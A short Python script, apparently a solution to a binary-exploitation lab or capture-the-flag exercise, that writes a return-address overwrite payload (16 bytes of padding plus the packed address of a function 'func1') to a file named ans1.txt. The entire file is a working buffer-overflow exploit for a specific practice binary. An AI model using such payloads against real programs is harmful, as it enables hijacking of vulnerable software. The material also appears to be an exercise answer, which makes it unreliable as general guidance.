
import struct

func1_addr = 0x401216
offset = 16
padding = b"A" * offset
target_addr = struct.pack('<Q', func1_addr)
payload = padding + target_addr

with open("ans1.txt", "wb") as f:
    f.write(payload)

print(f"[+] Payload written to ans1.txt")
print(f"[+] Target:  func1 at 0x{func1_addr:x}")
